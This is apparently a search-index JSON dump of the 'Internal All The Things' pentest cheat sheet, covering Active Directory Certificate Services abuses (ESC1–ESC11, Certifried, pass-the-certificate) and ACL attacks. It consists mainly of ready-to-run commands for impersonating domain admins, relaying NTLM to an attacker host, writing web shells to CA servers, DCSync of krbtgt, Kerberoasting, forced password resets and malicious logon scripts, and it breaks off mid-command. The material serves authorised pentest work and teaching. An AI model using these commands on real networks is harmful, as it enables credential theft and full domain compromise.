{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Internal All The Things","text":"<p>Active Directory and Internal Pentest Cheatsheets</p> <p> </p>"},{"location":"#documentation","title":"\ud83d\udcd6 Documentation","text":"<ul> <li>Feel free to update any pages with your knowledge by submitting a Pull Request</li> <li>Content in this repository is provided as is, for learning purpose. The author and contributors take no responsibility if you break something.</li> </ul>"},{"location":"#contributions","title":"\ud83d\udc68\u200d\ud83d\udcbb Contributions","text":"<p>Thanks again for your contribution! </p> <p>You can also share the project and contribute with a Github Sponsorship.   </p>"},{"location":"active-directory/ad-adcs-certificate-services/","title":"Active Directory - Certificate Services","text":"<p>Active Directory Certificate Services (AD CS) is a Microsoft Windows server role that provides a public key infrastructure (PKI). It allows you to create, manage, and distribute digital certificates, which are used to secure communication and transactions across a network. </p>"},{"location":"active-directory/ad-adcs-certificate-services/#adcs-enumeration","title":"ADCS Enumeration","text":"<ul> <li>crackmapexec: <code>crackmapexec ldap domain.lab -u username -p password -M adcs</code></li> <li>ldapsearch: <code>ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=&lt;user&gt;,OU=Users,DC=domain,DC=local' -w '&lt;password&gt;' -b \"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local\" dNSHostName</code></li> <li>certutil: <code>certutil.exe -config - -ping</code>, <code>certutil -dump</code></li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#esc1-misconfigured-certificate-templates","title":"ESC1 - Misconfigured Certificate Templates","text":"<p>Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.</p> <p>Requirements</p> <ul> <li>Template that allows for AD authentication</li> <li>ENROLLEE_SUPPLIES_SUBJECT flag</li> <li>[PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) </li> </ul> <p>Exploitation</p> <ul> <li>Use Certify.exe to see if there are any vulnerable templates     <pre><code>Certify.exe find /vulnerable\nCertify.exe find /vulnerable /currentuser\n# or\nPS&gt; Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'\n# or\ncertipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound\n# or\npython bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=lab,DC=local' --filter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'\n</code></pre></li> <li>Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate)     <pre><code># request certificates for the machine account by executing Certify with the \"/machine\" argument from an elevated command prompt.\nCertify.exe request /ca:dc.domain.local\\domain-DC-CA /template:VulnTemplate /altname:domadmin\ncerti.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN\ncertipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'\n</code></pre></li> <li>Use OpenSSL and convert the certificate, do not enter a password     <pre><code>openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n</code></pre></li> <li>Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus     <pre><code>Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx\n</code></pre></li> </ul> <p>WARNING: These certificates will still be usable even if the user or computer resets their password!</p> <p>NOTE: Look for EDITF_ATTRIBUTESUBJECTALTNAME2, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, ManageCA flags, and NTLM Relay to AD CS HTTP Endpoints.</p>"},{"location":"active-directory/ad-adcs-certificate-services/#esc2-misconfigured-certificate-templates","title":"ESC2 - Misconfigured Certificate Templates","text":"<p>Requirements</p> <ul> <li>Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)</li> </ul> <p>Exploitation</p> <ul> <li>Find template   <pre><code>PS &gt; Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'\n# or\npython bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'\n</code></pre></li> <li>Request a certificate specifying the <code>/altname</code> as a domain admin like in ESC1.</li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#esc3-misconfigured-enrollment-agent-templates","title":"ESC3 - Misconfigured Enrollment Agent Templates","text":"<p>ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users</p> <ul> <li>Request a certificate based on the vulnerable certificate template ESC3.   <pre><code>$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'\n[*] Saved certificate and private key to 'john.pfx'\n</code></pre></li> <li>Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user    <pre><code>$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#esc4-access-control-vulnerabilities","title":"ESC4 - Access Control Vulnerabilities","text":"<p>Enabling the <code>mspki-certificate-name-flag</code> flag for a template that allows for domain authentication, allow attackers to \"push a misconfiguration to a template leading to ESC1 vulnerability</p> <ul> <li>Search for <code>WriteProperty</code> with value <code>00000000-0000-0000-0000-000000000000</code> using modifyCertTemplate <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl\n</code></pre></li> <li>Add the <code>ENROLLEE_SUPPLIES_SUBJECT</code> (ESS) flag to perform ESC1   <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag\n\n# Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. \nC:\\&gt;StandIn.exe --adcs --filter WebServer --ess --add\n</code></pre></li> <li>Perform ESC1 and then restore the value   <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag\n</code></pre></li> </ul> <p>Using Certipy</p> <pre><code># overwrite the configuration to make it vulnerable to ESC1\ncertipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old\n# request a certificate based on the ESC4 template, just like ESC1.\ncertipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'\n# restore the old configuration\ncertipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json\n</code></pre>"},{"location":"active-directory/ad-adcs-certificate-services/#esc6-editf_attributesubjectaltname2","title":"ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2","text":"<p>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name. </p> <p>Exploitation</p> <ul> <li>Use Certify.exe to check for UserSpecifiedSAN flag state which refers to the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.     <pre><code>Certify.exe cas\n</code></pre></li> <li>Request a certificate for a template and add an altname, even though the default <code>User</code> template doesn't normally allow to specify alternative names     <pre><code>.\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User /altname:DomAdmin\n</code></pre></li> </ul> <p>Mitigation</p> <ul> <li>Remove the flag: <code>certutil.exe -config \"CA01.domain.local\\CA01\" -setreg \"policy\\EditFlags\" -EDITF_ATTRIBUTESUBJECTALTNAME2</code></li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#esc7-vulnerable-certificate-authority-access-control","title":"ESC7 - Vulnerable Certificate Authority Access Control","text":"<p>Exploitation</p> <ul> <li>Detect CAs that allow low privileged users the <code>ManageCA</code>  or <code>Manage Certificates</code> permissions     <pre><code>Certify.exe find /vulnerable\n</code></pre></li> <li>Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)     <pre><code>Certify.exe setconfig /enablesan /restart\n</code></pre></li> <li>Request the certificate with the desired SAN.     <pre><code>Certify.exe request /template:User /altname:super.adm\n</code></pre></li> <li>Grant approval if required or disable the approval requirement     <pre><code># Grant\nCertify.exe issue /id:[REQUEST ID]\n# Disable\nCertify.exe setconfig /removeapproval /restart\n</code></pre></li> </ul> <p>Alternative exploitation from ManageCA to RCE on ADCS server: </p> <pre><code># Get the current CDP list. Useful to find remote writable shares:\nCertify.exe writefile /ca:SERVER\\ca-name /readonly\n\n# Write an aspx shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\Local\\Path\\shell.aspx\n\n# Write the default asp shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:c:\\inetpub\\wwwroot\\shell.asp\n\n# Write a php shell to a remote web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php\n</code></pre>"},{"location":"active-directory/ad-adcs-certificate-services/#esc8-ad-cs-relay-attack","title":"ESC8 - AD CS Relay Attack","text":"<p>An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller\u2019s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.</p> <p>Require Impacket PR #1101</p> <ul> <li> <p>Version 1: NTLM Relay + Rubeus + PetitPotam   <pre><code>impacket&gt; python3 ntlmrelayx.py -t http://&lt;ca-server&gt;/certsrv/certfnsh.asp -smb2support --adcs\nimpacket&gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate\n# For a member server or workstation, the template would be \"Computer\".\n# Other templates: workstation, DomainController, Machine, KerberosAuthentication\n\n# Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam \n# You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN\ngit clone https://github.com/topotam/PetitPotam\npython3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP\npython3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\npython3 dementor.py &lt;listener&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -d &lt;domain&gt;\npython3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local\n\n# Use the certificate with rubeus to request a TGT\nRubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt\nRubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt\n\n# Now you can use the TGT to perform a DCSync\nmimikatz&gt; lsadump::dcsync /user:krbtgt\n</code></pre></p> </li> <li> <p>Version 2: NTLM Relay + Mimikatz + Kekeo   <pre><code>impacket&gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# Mimikatz\nmimikatz&gt; misc::efs /server:dc.lab.local /connect:&lt;IP&gt; /noauth\n\n# Kekeo\nkekeo&gt; base64 /input:on\nkekeo&gt; tgt::ask /pfx:&lt;BASE64-CERT-FROM-NTLMRELAY&gt; /user:dc$ /domain:lab.local /ptt\n\n# Mimikatz\nmimikatz&gt; lsadump::dcsync /user:krbtgt\n</code></pre></p> </li> <li> <p>Version 3: Kerberos Relay   <pre><code># Setup the relay\nsudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine\n\n# Run mitm6\nsudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v\n</code></pre></p> </li> <li> <p>Version 4: ADCSPwn - Require <code>WebClient</code> service running on the domain controller. By default this service is not installed.   <pre><code>https://github.com/bats3c/ADCSPwn\nadcspwn.exe --adcs &lt;cs server&gt; --port [local port] --remote [computer]\nadcspwn.exe --adcs cs.pwnlab.local\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local\n\n# ADCSPwn arguments\nadcs            -       This is the address of the AD CS server which authentication will be relayed to.\nsecure          -       Use HTTPS with the certificate service.\nport            -       The port ADCSPwn will listen on.\nremote          -       Remote machine to trigger authentication from.\nusername        -       Username for non-domain context.\npassword        -       Password for non-domain context.\ndc              -       Domain controller to query for Certificate Templates (LDAP).\nunc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .\noutput          -       Output path to store base64 generated crt.\n</code></pre></p> </li> <li> <p>Version 5: Certipy ESC8   <pre><code>certipy relay -ca 172.16.19.100\n</code></pre></p> </li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#esc9-no-security-extension","title":"ESC9 - No Security Extension","text":"<p>Requirements</p> <ul> <li><code>StrongCertificateBindingEnforcement</code> set to <code>1</code> (default) or <code>0</code></li> <li>Certificate contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value</li> <li>Certificate specifies <code>Any Client</code> authentication EKU</li> <li><code>GenericWrite</code> over any account A to compromise any account B</li> </ul> <p>Scenario</p> <p>John@corp.local has GenericWrite over Jane@corp.local, and we want to compromise Administrator@corp.local.  Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.</p> <ul> <li>Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)     <pre><code>certipy shadow auto -username John@corp.local -p Passw0rd -account Jane\n</code></pre></li> <li>Change the userPrincipalName of Jane to be Administrator.  leave the <code>@corp.local</code> part     <pre><code>certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator\n</code></pre></li> <li>Request the vulnerable certificate template ESC9 from Jane's account.     <pre><code>certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9\n# userPrincipalName in the certificate is Administrator \n# the issued certificate contains no \"object SID\"\n</code></pre></li> <li>Restore userPrincipalName of Jane to Jane@corp.local.     <pre><code>certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local\n</code></pre></li> <li>Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user.      <pre><code>certipy auth -pfx administrator.pfx -domain corp.local\n# Add -domain &lt;domain&gt; to your command line since there is no domain specified in the certificate.\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#esc11-relaying-ntlm-to-icpr","title":"ESC11 - Relaying NTLM to ICPR","text":"<p>Encryption is not enforced for ICPR requests and Request Disposition is set to Issue</p> <p>Requirements: * sploutchy/Certipy - Certipy fork * sploutchy/impacket - Impacket fork</p> <p>Exploitation: 1. Look for <code>Enforce Encryption for Requests: Disabled</code> in <code>certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout</code> output 2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.     <pre><code>ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support\n</code></pre></p>"},{"location":"active-directory/ad-adcs-certificate-services/#certifried-cve-2022-26923","title":"Certifried CVE-2022-26923","text":"<p>An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.</p> <ul> <li>Find <code>ms-DS-MachineAccountQuota</code> <pre><code>bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'DC=lab,DC=local' ms-DS-MachineAccountQuota \n</code></pre></li> <li>Add a new computer in the Active Directory, by default <code>MachineAccountQuota = 10</code> <pre><code>bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 add computer cve 'CVEPassword1234*'\ncertipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'\n</code></pre></li> <li>[ALTERNATIVE] If you are <code>SYSTEM</code> and the <code>MachineAccountQuota=0</code>: Use a ticket for the current machine and reset its SPN   <pre><code>Rubeus.exe tgtdeleg\nexport KRB5CCNAME=/tmp/ws02.ccache\nbloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local set object 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName\n</code></pre></li> <li>Set the <code>dNSHostName</code> attribute to match the Domain Controller hostname   <pre><code>bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 set object 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName -v DC.lab.local\nbloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'CN=cve,CN=Computers,DC=lab,DC=local' --attr dNSHostName\n</code></pre></li> <li>Request a ticket   <pre><code># certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA\ncertipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA\n</code></pre></li> <li>Either use the pfx or set a RBCD on your machine account to takeover the domain   <pre><code>certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10\n\nopenssl pkcs12 -in dc.pfx -out dc.pem -nodes\nbloodyAD -d lab.local  -c \":dc.pem\" -u 'cve$' --host 10.10.10.10 add rbcd 'CRASHDC$' 'CVE$'\ngetST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   \nsecretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 \n</code></pre></li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#pass-the-certificate","title":"Pass-The-Certificate","text":"<p>Pass the Certificate in order to get a TGT, this technique is used in \"UnPAC the Hash\" and \"Shadow Credential\"</p> <ul> <li>Windows   <pre><code># Information about a cert file\ncertutil -v -dump admin.pfx\n\n# From a Base64 PFX\nRubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show\n\n# Grant DCSync rights to an user\n./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --sid &lt;user_SID&gt;\n# To restore\n./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --restore restoration_file.txt\n</code></pre></li> <li>Linux   <pre><code># Base64-encoded PFX certificate (string) (password can be set)\ngettgtpkinit.py -pfx-base64 $(cat \"PATH_TO_B64_PFX_CERT\") \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\u200b\n# PEM certificate (file) + PEM private key (file)\ngettgtpkinit.py -cert-pem \"PATH_TO_PEM_CERT\" -key-pem \"PATH_TO_PEM_KEY\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\n# PFX certificate (file) + password (string, optionnal)\ngettgtpkinit.py -cert-pfx \"PATH_TO_PFX_CERT\" -pfx-pass \"CERT_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\n# Using Certipy\ncertipy auth -pfx \"PATH_TO_PFX_CERT\" -dc-ip 'dc-ip' -username 'user' -domain 'domain'\ncertipy cert -export -pfx \"PATH_TO_PFX_CERT\" -password \"CERT_PASSWORD\" -out \"unprotected.pfx\"\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#unpac-the-hash","title":"UnPAC The Hash","text":"<p>Using the UnPAC The Hash method, you can retrieve the NT Hash for an User via its certificate.</p> <ul> <li>Windows     <pre><code># Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.\nRubeus.exe asktgt /getcredentials /user:\"TARGET_SAMNAME\" /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show\n</code></pre></li> <li>Linux     <pre><code># Obtain a TGT by validating a PKINIT pre-authentication\n$ gettgtpkinit.py -cert-pfx \"PATH_TO_CERTIFICATE\" -pfx-pass \"CERTIFICATE_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\n# Use the session key to recover the NT hash\n$ export KRB5CCNAME=\"TGT_CCACHE_FILE\" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adcs-certificate-services/#references","title":"References","text":"<ul> <li>Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021</li> <li>Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_</li> <li>Certified Pre-Owned - Will Schroeder - Jun 17 2021</li> <li>Microsoft ADCS \u2013 Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021</li> <li>NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema</li> <li>AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021</li> <li>ADCS: Playing with ESC4 - Matthew Creel</li> <li>AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022</li> <li>AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Mart\u00ednez, Kurosh Dabbagh</li> <li>Certifried: Active Directory Domain Privilege Escalation (CVE-2022\u201326923) - Oliver Lyak</li> <li>UnPAC the hash - The Hacker Recipes</li> <li>AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev</li> <li>Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER</li> <li>bloodyAD and CVE-2022-26923 - soka - 11 May 2022</li> <li>Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022</li> <li>Certificate templates - The Hacker Recipes</li> <li>CA configuration - The Hacker Recipes</li> <li>Access controls - The Hacker Recipes</li> <li>Web endpoints - The Hacker Recipes</li> </ul>"},{"location":"active-directory/ad-adds-acl-ace/","title":"Active Directory - Access Controls ACL/ACE","text":"<ul> <li>ACL: Access Control Lists</li> <li> <p>ACE: Access Control Entry</p> </li> <li> <p>Check ACL for an User with ADACLScanner. <pre><code>ADACLScan.ps1 -Base \"DC=contoso;DC=com\" -Filter \"(&amp;(AdminCount=1))\" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show\n</code></pre></p> </li> <li> <p>Automate ACL exploit Invoke-ACLPwn: <pre><code>./Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'\n</code></pre></p> </li> </ul>"},{"location":"active-directory/ad-adds-acl-ace/#genericallgenericwrite","title":"GenericAll/GenericWrite","text":""},{"location":"active-directory/ad-adds-acl-ace/#usercomputer","title":"User/Computer","text":"<ul> <li> <p>We can set a SPN on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.</p> <ul> <li>Windows/Linux     <pre><code># Check for interesting permissions on accounts:\nbloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName'\n\n# Check if current user has already an SPN setted:\nbloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get object &lt;UserName&gt; --attr serviceprincipalname\n\n# Force set the SPN on the account: Targeted Kerberoasting\nbloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object &lt;UserName&gt; serviceprincipalname -v 'ops/whatever1'\n\n# Grab the ticket\nGetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/john.doe:Password123*' -request-user &lt;UserName&gt;\n\n# Remove the SPN\nbloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object &lt;UserName&gt; serviceprincipalname\n</code></pre></li> <li>Windows only     <pre><code># Check for interesting permissions on accounts:\nInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"RDPUsers\"}\n\n# Check if current user has already an SPN setted:\nPowerView2 &gt; Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname\n\n# Force set the SPN on the account: Targeted Kerberoasting\nPowerView2 &gt; Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname='ops/whatever1'}\nPowerView3 &gt; Set-DomainObject -Identity &lt;UserName&gt; -Set @{serviceprincipalname='any/thing'}\n\n# Grab the ticket\nPowerView2 &gt; $User = Get-DomainUser username \nPowerView2 &gt; $User | Get-DomainSPNTicket | fl\nPowerView2 &gt; $User | Select serviceprincipalname\n\n# Remove the SPN\nPowerView2 &gt; Set-DomainObject -Identity username -Clear serviceprincipalname\n</code></pre></li> </ul> </li> <li> <p>We can change a victim's userAccountControl to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.</p> <ul> <li>Windows/Linux:     <pre><code># Modify the userAccountControl\n$ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH\n\n# Grab the ticket\n$ GetNPUsers.py DOMAIN/target_user -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;\n\n# Set back the userAccountControl\n$ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac [Target_User] -f DONT_REQ_PREAUTH\n</code></pre></li> <li>Windows only:     <pre><code># Modify the userAccountControl\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\nPowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose\n\n# Grab the ticket\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\nASREPRoast &gt; Get-ASREPHash -Domain domain.local -UserName username\n\n# Set back the userAccountControl\nPowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\n</code></pre></li> </ul> </li> <li> <p>Reset another user's password.</p> <ul> <li>Windows/Linux:     <pre><code># Using bloodyAD with pass-the-hash\nbloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!'\n</code></pre></li> <li>Windows only:     <pre><code># https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1\n$user = 'DOMAIN\\user1'; \n$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; \n$creds = New-Object System.Management.Automation.PSCredential $user, $pass;\n$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; \nSet-DomainUserPassword -Identity 'DOMAIN\\user2' -AccountPassword $newpass -Credential $creds;\n</code></pre></li> <li>Linux only:     <pre><code># Using rpcclient from the  Samba software suite\nrpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" \n</code></pre></li> </ul> </li> <li> <p>WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : </p> <ul> <li>Windows/Linux:     <pre><code>bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\\\10.0.0.5\\totallyLegitScript.ps1'\n</code></pre></li> <li>Windows only:     <pre><code>Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue 